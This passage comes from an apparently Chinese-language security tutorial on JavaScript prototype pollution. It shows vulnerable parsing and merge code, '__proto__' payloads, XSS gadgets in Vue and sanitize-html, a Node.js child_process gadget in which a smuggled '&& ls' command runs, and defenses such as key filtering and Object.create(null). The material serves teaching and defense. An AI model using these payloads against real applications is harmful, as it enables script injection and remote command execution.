class="language-js"><span class="token comment">// 先假設可以污染原型上的屬性</span><br><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;img src=x onerror=alert(1)>'</span><br><br><span class="token comment">// 底下都跟剛剛一樣</span><br><span class="token keyword">var</span> qs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br><br>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token punctuation">{</span><br>  tag<span class="token operator">:</span> <span class="token string">'h2'</span><span class="token punctuation">,</span><br>  innerText<span class="token operator">:</span> <span class="token template-string"><span class="token string template-punctuation">`</span><span class="token string">Search result for </span><span class="token interpolation"><span class="token punctuation interpolation-punctuation">${</span>qs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'q'</span><span class="token punctuation">)</span><span class="token punctuation interpolation-punctuation">}</span></span><span class="token string template-punctuation">`</span></span><br><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br><br><span class="token keyword">function</span> <span class="token function">createElement</span><span class="token punctuation">(</span><span class="token parameter">config</span><span class="token punctuation">)</span><span class="token punctuation">{</span><br>  <span class="token keyword">const</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>tag<span class="token punctuation">)</span><br>  <span class="token comment">// 這一行因為原型鏈被污染，所以 if(config.innerHTML) 的結果會是 true</span><br>  <span class="token keyword">if</span> <span class="token punctuation">(</span>config<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span> <span class="token punctuation">{</span><br>    element<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> config<span class="token punctuation">.</span>innerHTML<br>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><br>    element<span class="token punctuation">.</span>innerText <span class="token operator">=</span> config<span class="token punctuation">.</span>innerText<br>  <span class="token punctuation">}</span><br>  <span class="token keyword">return</span> element<br><span class="token punctuation">}</span></code></pre><p>整份程式碼只差在開頭，多了一個 <code>Object.prototype.innerHTML = '&lt;img src=x onerror=alert(1)>'</code>，而就因為這一行污染了 innerHTML，導致底下 <code>if (config.innerHTML) {</code> 的判斷變成 true，行為被改變，原本是用 <code>innerText</code>，現在改成用 <code>innerHTML</code>，最後就達成了 XSS！</p><p>這就是由 prototype pollution 所引發的 XSS 攻擊。一般來說，prototype pollution 指的是程式有漏洞，導致攻擊者可以污染原型鏈上的屬性，但是除了污染以外，還必須找到可以影響的地方，加在一起才能形成完整的攻擊。</p><p>此時的你應該很好奇，那到底怎樣的程式碼會有漏洞，居然能讓攻擊者去改原型鏈上的屬性。</p><h2 id="prototype-pollution-%E6%98%AF%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F%E7%9A%84%EF%BC%9F"><a href="#prototype-pollution-%E6%98%AF%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F%E7%9A%84%EF%BC%9F" class="direct-link">#</a> Prototype pollution 是怎麼發生的？</h2><p>有兩個例子很常發生這種事情，第一個是解析 query string。</p><p>你可能想說 query string 不就 <code>?a=1&b=2</code> 這種類型，有什麼難的？但其實許多函式庫的 query string 都有支援陣列，像是 <code>?a=1&a=2</code> 或是 <code>?a[]=1&a[]=2</code> 都有可能被解析為陣列。</p><p>除了陣列以外，有些甚至還支援物件，像是這樣：<code>?a[b][c]=1</code>，就會產生一個 <code>{a: {b: {c: 1}}}</code> 的物件出來。</p><p>舉例來說，<a href="https://github.com/ljharb/qs#parsing-objects" rel="noopener noreferrer" target="_blank">qs</a> 這個 library 就有支援物件的解析。</p><p>今天如果是你要來負責這個功能，你會怎麼寫呢？我們可以寫一個只針對物件的陽春版本（先不考慮 URL encode 的情況，也不考慮陣列）：</p><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">parseQs</span><span class="token punctuation">(</span><span class="token parameter">qs</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><br>  <span class="token keyword">let</span> arr <span class="token operator">=</span> qs<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'&'</span><span class="token punctuation">)</span><br>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> item <span class="token keyword">of</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span><br>    <span class="token keyword">let</span> <span class="token punctuation">[</span>key<span class="token punctuation">,</span> value<span class="token punctuation">]</span> <span class="token operator">=</span> item<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><br>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>key<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>      <span class="token comment">// 針對一般的 key=value</span><br>      result<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value<br>      <span class="token keyword">continue</span><br>    <span class="token punctuation">}</span><br><br>    <span class="token comment">// 針對物件</span><br>    <span class="token keyword">let</span> items <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span><br>    <span class="token keyword">let</span> obj <span class="token operator">=</span> result<br>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> items<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>      <span class="token keyword">let</span> objKey <span class="token operator">=</span> items<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token language-regex regex-source">]$</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><br>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">===</span> items<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>        obj<span class="token punctuation">[</span>objKey<span class="token punctuation">]</span> <span class="token operator">=</span> value<br>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><br>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> obj<span class="token punctuation">[</span>objKey<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>          obj<span class="token punctuation">[</span>objKey<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><br>        <span class="token punctuation">}</span><br>        obj <span class="token operator">=</span> obj<span class="token punctuation">[</span>objKey<span class="token punctuation">]</span><br>      <span class="token punctuation">}</span><br>    <span class="token punctuation">}</span><br>  <span class="token punctuation">}</span><br>  <span class="token keyword">return</span> result<br><span class="token punctuation">}</span><br><br><span class="token keyword">var</span> qs <span class="token operator">=</span> <span class="token function">parseQs</span><span class="token punctuation">(</span><span class="token string">'test=1&a[b][c]=2'</span><span class="token punctuation">)</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>qs<span class="token punctuation">)</span><br><span class="token comment">// { test: '1', a: { b: { c: '2' } } }</span></code></pre><p>基本上就是根據 <code>[]</code> 裡面的內容去構造出一個物件，一層一層去賦值，看起來沒什麼特別的。</p><p>但是！如果我的 query string 長這樣，事情就不一樣了：</p><pre class="language-js"><code class="language-js"><span class="token keyword">var</span> qs <span class="token operator">=</span> <span class="token function">parseQs</span><span class="token punctuation">(</span><span class="token string">'__proto__[a]=3'</span><span class="token punctuation">)</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>qs<span class="token punctuation">)</span> <span class="token comment">// {}</span><br><br><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// 3</span></code></pre><p>當我的 query string 是這樣的時候，<code>parseQs</code> 就會去改變 <code>obj.__proto__.a</code> 的值，造成了 prototype pollution，導致我後來宣告一個空的物件，在印出 <code>obj.a</code> 的時候卻印出了 3，因為物件原型已經被污染了。</p><p>有不少在解析 query string 的 library 都出過類似的問題，底下簡單舉幾個例子：</p><ol><li><a href="https://snyk.io/vuln/SNYK-JS-JQUERYDEPARAM-1255651" rel="noopener noreferrer" target="_blank">jquery-deparam</a></li><li><a href="https://snyk.io/vuln/SNYK-JS-BACKBONEQUERYPARAMETERS-1290381" rel="noopener noreferrer" target="_blank">backbone-query-parameters</a></li><li><a href="https://snyk.io/vuln/SNYK-JS-JQUERYQUERYOBJECT-1255650" rel="noopener noreferrer" target="_blank">jquery-query-object</a></li></ol><p>除了解析 query string 以外，另一個功能也很常發生這個問題，叫做合併物件，一個簡單的合併物件函式長得像這樣：</p><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> prop <span class="token keyword">in</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span><br>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> a<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><br>      <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><span class="token punctuation">)</span><br>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><br>      a<span class="token punctuation">[</span>prop<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>prop<span class="token punctuation">]</span><br>    <span class="token punctuation">}</span><br>  <span class="token punctuation">}</span> <br><span class="token punctuation">}</span><br><br><span class="token keyword">var</span> config <span class="token operator">=</span> <span class="token punctuation">{</span><br>  a<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span><br>  b<span class="token operator">:</span> <span class="token punctuation">{</span><br>    c<span class="token operator">:</span> <span class="token number">2</span><br>  <span class="token punctuation">}</span><br><span class="token punctuation">}</span><br><br><span class="token keyword">var</span> customConfig <span class="token operator">=</span> <span class="token punctuation">{</span><br>  b<span class="token operator">:</span> <span class="token punctuation">{</span><br>    d<span class="token operator">:</span> <span class="token number">3</span><br>  <span class="token punctuation">}</span><br><span class="token punctuation">}</span><br><br><span class="token function">merge</span><span class="token punctuation">(</span>config<span class="token punctuation">,</span> customConfig<span class="token punctuation">)</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><br><span class="token comment">// { a: 1, b: { c: 2, d: 3 } }</span></code></pre><p>如果上面的 <code>customConfig</code> 是可以控制的，那就會發生問題：</p><pre class="language-js"><code class="language-js"><span class="token keyword">var</span> config <span class="token operator">=</span> <span class="token punctuation">{</span><br>  a<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span><br>  b<span class="token operator">:</span> <span class="token punctuation">{</span><br>    c<span class="token operator">:</span> <span class="token number">2</span><br>  <span class="token punctuation">}</span><br><span class="token punctuation">}</span><br><br><span class="token keyword">var</span> customConfig <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'{"__proto__": {"a": 1}}'</span><span class="token punctuation">)</span><br><span class="token function">merge</span><span class="token punctuation">(</span>config<span class="token punctuation">,</span> customConfig<span class="token punctuation">)</span><br><br><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>a<span class="token punctuation">)</span></code></pre><p>這邊之所以用到 <code>JSON.parse</code>，是因為如果直接寫：</p><pre class="language-js"><code class="language-js"><span class="token keyword">var</span> customConfig <span class="token operator">=</span> <span class="token punctuation">{</span><br>  __proto__<span class="token operator">:</span> <span class="token punctuation">{</span><br>    a<span class="token operator">:</span> <span class="token number">1</span><br>  <span class="token punctuation">}</span><br><span class="token punctuation">}</span></code></pre><p>是沒有用的，<code>customConfig</code> 只會是一個空物件而已。要用 <code>JSON.parse</code>，才能製造出一個「key 是 <code>__proto__</code>」的物件：</p><pre class="language-js"><code class="language-js"><span class="token keyword">var</span> obj1 <span class="token operator">=</span> <span class="token punctuation">{</span><br>  __proto__<span class="token operator">:</span> <span class="token punctuation">{</span><br>    a<span class="token operator">:</span> <span class="token number">1</span><br>  <span class="token punctuation">}</span><br><span class="token punctuation">}</span><br><span class="token keyword">var</span> obj2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'{"__proto__": {"a": 1}}'</span><span class="token punctuation">)</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj1<span class="token punctuation">)</span> <span class="token comment">// {}</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj2<span class="token punctuation">)</span> <span class="token comment">// { __proto__: { a: 1 } }</span></code></pre><p>同樣地，也有許多 merge 相關的 library 曾經有這個漏洞，底下簡單列舉幾個：</p><ol><li><a href="https://snyk.io/vuln/SNYK-JS-MERGE-1040469" rel="noopener noreferrer" target="_blank">merge</a></li><li><a href="https://snyk.io/vuln/SNYK-JS-LODASHMERGE-173733" rel="noopener noreferrer" target="_blank">lodash.merge</a></li><li><a href="https://snyk.io/vuln/SNYK-JS-PLAINOBJECTMERGE-1085643" rel="noopener noreferrer" target="_blank">plain-object-merge</a></li></ol><p>除了這些以外，只要是操作物件相關的 library 基本上都出現過類似問題，像是：</p><ol><li><a href="https://snyk.io/vuln/SNYK-JS-IMMER-1019369" rel="noopener noreferrer" target="_blank">immer</a></li><li><a href="https://snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536" rel="noopener noreferrer" target="_blank">mootools</a></li><li><a href="https://snyk.io/vuln/SNYK-JS-IOREDIS-1567196" rel="noopener noreferrer" target="_blank">ioredis</a></li></ol><p>現在已經知道哪些地方容易發生 prototype pollution 的問題了，但如果只是污染原型上的屬性，是沒有用的，還需要找到能影響到的地方，也就是說，有哪些地方在屬性被污染以後，行為會改變，可以讓我們執行攻擊？</p><h2 id="prototype-pollution-script-gadgets"><a href="#prototype-pollution-script-gadgets" class="direct-link">#</a> Prototype pollution script gadgets</h2><p>這些「只要我們污染了 prototype，就可以拿來利用的程式碼」叫做 script gadget，有一個 GitHub repo 專門搜集了這些 gadget：<a href="https://github.com/BlackFan/client-side-prototype-pollution" rel="noopener noreferrer" target="_blank">Client-Side Prototype Pollution</a>，有些 gadget 可能是你想像不到的，我來示範一下（<a href="https://aszx87410.github.io/demo/prototype-pollution/vue.html" rel="noopener noreferrer" target="_blank">demo 網頁</a>）：</p><pre class="language-html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><br><br><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><br><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><br>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><br>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://unpkg.com/vue/dist/vue.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><br><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><br><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><br>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><br>    {{ message }}<br>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><br>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><br>    <span class="token comment">// 污染 template</span><br>    <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>template <span class="token operator">=</span> <span class="token string">'&lt;svg onload=alert(1)>&lt;/svg>'</span><span class="token punctuation">;</span><br>    <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span> <br>      el<span class="token operator">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span><br>      data<span class="token operator">:</span> <span class="token punctuation">{</span><br>        message<span class="token operator">:</span> <span class="token string">'Hello Vue!'</span><br>      <span class="token punctuation">}</span><br>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><br><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><br><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>一段看起來沒什麼的 Vue hello world，在我們污染了 <code>Object.prototype.template</code> 之後，就變成了 XSS，可以讓我們插入任意程式碼。</p><p>或是像下面這樣（<a href="https://aszx87410.github.io/demo/prototype-pollution/vue.html" rel="noopener noreferrer" target="_blank">demo 網頁</a>）：</p><pre class="language-html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><br><br><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><br><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><br>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><br>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/sanitize-html/1.27.5/sanitize-html.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><br><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><br><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><br>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><br>    <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">'&lt;svg onload=alert(1)>&lt;/svg>'</span><span class="token punctuation">;</span><br>    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">sanitizeHtml</span><span class="token punctuation">(</span><span class="token string">'&lt;div>hello&lt;/div>'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><br><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><br><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>明明是做 sanitize 的 library，在污染了 <code>Object.prototype.innerText</code> 之後，就變成了 XSS 的好幫手。</p><p>為什麼會有這些問題出現呢？以上面的 <code>sanitize-html</code> 為例，是因為有這一段程式碼：</p><pre class="language-js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>frame<span class="token punctuation">.</span>innerText <span class="token operator">&&</span> <span class="token operator">!</span>hasText <span class="token operator">&&</span> <span class="token operator">!</span>options<span class="token punctuation">.</span>textFilter<span class="token punctuation">)</span> <span class="token punctuation">{</span><br>    result <span class="token operator">+=</span> frame<span class="token punctuation">.</span>innerText<span class="token punctuation">;</span><br><span class="token punctuation">}</span></code></pre><p>因為直接預設了 innerText 是安全的字串，所以就直接拼接上去，而我們污染了這個屬性，因此當這個屬性不存在時，就會用到 prototype 的值，最後變成了 XSS。</p><p>除了 client side 以外，server side 的 Node.js 也有類似的風險，例如說這樣：</p><pre class="language-js"><code class="language-js"><span class="token keyword">const</span> child_process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><br><span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'123'</span><span class="token punctuation">]</span><br><span class="token keyword">const</span> result <span class="token operator">=</span> child_process<span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><br>  <span class="token string">'echo'</span><span class="token punctuation">,</span> params<br><span class="token punctuation">)</span><span class="token punctuation">;</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 123</span></code></pre><p>這是一段很單純的程式碼，執行 <code>echo</code> 指令然後傳入參數，這個參數會自動幫你做處理，所以不用擔心 command injection 的問題：</p><pre class="language-js"><code class="language-js"><span class="token keyword">const</span> child_process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><br><span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'123 && ls'</span><span class="token punctuation">]</span><br><span class="token keyword">const</span> result <span class="token operator">=</span> child_process<span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><br>  <span class="token string">'echo'</span><span class="token punctuation">,</span> params<br><span class="token punctuation">)</span><span class="token punctuation">;</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 123 && ls</span></code></pre><p>但如果有一個 prototype pollution 的漏洞，就可以搖身一變成為 RCE（Remote code execution），讓攻擊者執行任意指令（假設攻擊者可以控制 params）：</p><pre class="language-js"><code class="language-js"><span class="token keyword">const</span> child_process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><br><span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'123 && ls'</span><span class="token punctuation">]</span><br><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>shell <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token comment">// 只多了這行，參數的解析就會不一樣</span><br><span class="token keyword">const</span> result <span class="token operator">=</span> child_process<span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><br>  <span class="token string">'echo'</span><span class="token punctuation">,</span> params<span class="token punctuation">,</span> <span class="token punctuation">{</span>timeout<span class="token operator">:</span> <span class="token number">1000</span><span class="token punctuation">}</span><br><span class="token punctuation">)</span><span class="token punctuation">;</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br><span class="token comment">/*<br>123<br>index.js<br>node_modules<br>package-lock.json<br>package.json<br>*/</span></code></pre><p>之所以會這樣，是因為 <code>child_process.spawn</code> 的第三個參數 options 中有一個選項叫做 <code>shell</code>，設為 true 以後會造成行為不同，而官網的<a href="https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options" rel="noopener noreferrer" target="_blank">文件</a>也有寫說：</p><blockquote><p>If the shell option is enabled, do not pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution.</p></blockquote><p>透過 prototype pollution 搭配 script gadget（<code>child_process.spawn</code>），成功製造出一個嚴重性極高的漏洞。</p><h2 id="%E4%B8%AD%E5%A0%B4%E7%B8%BD%E7%B5%90"><a href="#%E4%B8%AD%E5%A0%B4%E7%B8%BD%E7%B5%90" class="direct-link">#</a> 中場總結</h2><p>如果程式中存在某個功能，能讓攻擊者污染到 prototype 上面的屬性，這個漏洞就叫做 prototype pollution，而 prototype pollution 本身用途不大，需要跟其他的程式碼結合才能發揮作用，而可以跟他結合的程式碼就叫做 script gadget。</p><p>例如說 Vue 的內部實作會根據某個物件的 <code>template</code> 這個屬性渲染出相對應的東西，於是我們只要污染 <code>Object.prototype.template</code>，就可以製造出一個 XSS 漏洞。或像是 <code>child_process.spawn</code> 用到了 <code>shell</code>，所以污染它以後就變成了 RCE 漏洞。</p><p>要修復的其實並不是那些可以利用的 script gadget，除非你把每個物件取值的地方都改掉，但這其實也不是根治的方式。真正根治的方式，是杜絕掉 prototype pollution，讓 prototype 不會被污染，就沒有這些問題了。</p><h2 id="%E8%A9%B2%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6"><a href="#%E8%A9%B2%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6" class="direct-link">#</a> 該如何防禦</h2><p>在 <a href="https://snyk.io/vuln/SNYK-JS-SWIPER-1088062" rel="noopener noreferrer" target="_blank">snyk</a> 的任何一個 prototype pollution 漏洞頁面上都會有防禦建議，也可以參考這一篇：<a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf" rel="noopener noreferrer" target="_blank">Prototype pollution attack in NodeJS application</a></p><p>常見的防禦方式有幾種，第一種是在做這些物件的操作時，阻止 <code>__proto__</code> 這個 key，例如說前面提到的解析 query string 跟 merge object 都可以採用這個方式。</p><p>但是除了 <code>__proto__</code> 以外，也要注意另外一種繞過方式，像這樣：</p><pre class="language-js"><code class="language-js"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><br>obj<span class="token punctuation">[</span><span class="token string">'constructor'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'prototype'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><br><span class="token keyword">var</span> obj2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><br>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj2<span class="token punctuation">.</span>a<span class="token punctuation">)</span> <span class="token comment">// 1</span></code></pre><p>用 <code>constructor.prototype</code> 也可以去污染原型鏈上的屬性，所以要把這幾種一起封掉才安全。</p><p>像是 <a href="https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad" rel="noopener noreferrer" target="_blank">lodash.merge</a> 的 prototype pollution 就是用這種方式修復的，當 key 是 <code>__proto__</code> 或是 <code>prototype</code> 的時候會做特殊處理。</p><p>第二種方式簡單易懂，就是不要用 object 了，或更精確地說，「不要用有 prototype 的 object」。</p><p>有些人可能看過一種建立物件的方式，是這樣的：<code>Object.create(null)</code>，這樣可以建立出一個沒有 <code>__proto__</code> 